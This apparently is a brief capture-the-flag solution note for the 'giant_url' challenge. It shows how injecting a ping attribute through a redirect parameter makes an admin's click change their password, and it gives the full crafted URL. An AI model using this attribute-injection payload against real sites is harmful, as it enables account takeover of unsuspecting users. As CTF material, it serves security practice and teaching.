''' Vulnerable at ping in <a> tag
We can insert <a href=aa ping="/admin/changepass?password=LONG_PASSWORD">this link</a> in the /redirect and admin's password will be change when he click on that url
https://giant_url.2019.chall.actf.co/redirect?url=aa%20ping=/admin/changepass?password=0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a
'''
